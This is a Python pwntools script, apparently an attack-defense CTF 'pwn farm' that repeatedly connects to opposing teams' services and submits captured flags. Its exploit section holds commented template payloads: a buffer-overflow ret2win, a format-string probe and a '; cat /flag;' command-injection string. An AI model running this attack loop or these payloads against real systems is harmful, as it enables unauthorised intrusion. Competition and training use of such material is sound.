from pwn import *
import re
import time
import requests

# --- CONFIGURATION ---
TEAM_TOKEN = "YOUR_TEAM_TOKEN"
SUBMIT_URL = "http://10.10.0.1/api/submit"
FLAG_REGEX = r"(ihack\{.*?\}|ihack2026\{.*?\}|ihack26\{.*?\})"

# Suppress verbose logging so the terminal doesn't spam
context.log_level = 'error'

def submit_flag(flag):
    try:
        r = requests.put(SUBMIT_URL, headers={"X-Team-Token": TEAM_TOKEN}, json=[flag], timeout=3)
        if r.status_code == 200: print(f"✅ [PWN FLAG] {flag}")
    except: pass

def attack_pwn(ip, port=1337):
    try:
        # Connect to the service
        p = remote(ip, port)
        
        # ==========================================
        # 🛠️ EXPLOIT LOGIC GOES HERE (Modify based on Ghidra)
        # ==========================================
        
        # SCENARIO 1: Password Bypass (You reversed the password)
        # p.recvuntil(b"Password: ")
        # p.sendline(b"Sup3rS3cr3tP@ss")
        
        # SCENARIO 2: Classic Buffer Overflow (ret2win)
        # offset = 64
        # win_address = 0x4011a9 # Example address from Ghidra
        # payload = b"A" * offset + p64(win_address)
        # p.sendline(payload)
        
        # SCENARIO 3: Format String Exploit
        # p.sendline(b"%x.%x.%x.%x")
        
        # SCENARIO 4: Command Injection in a menu (if the binary calls system())
        # p.recvuntil(b"Choice: ")
        # p.sendline(b"1")
        # p.recvuntil(b"Enter name: ")
        # p.sendline(b"; cat /flag;")

        # ==========================================
        
        # Receive the output and look for the flag
        output = p.recvall(timeout=3).decode('utf-8', errors='ignore')
        for flag in re.findall(FLAG_REGEX, output):
            submit_flag(flag)
            
        p.close()
    except Exception as e:
        pass # Silently fail if the port is closed or connection times out

# --- MAIN LOOP ---
if __name__ == "__main__":
    ENEMY_IPS = ["10.10.1.1", "10.10.2.1"] # Add all IPs here
    print("Starting Pwn Farm...")
    while True:
        for ip in ENEMY_IPS:
            # You might need to change the port based on the challenge
            attack_pwn(ip, port=1337) 
            attack_pwn(ip, port=9001) 
            attack_pwn(ip, port=31337)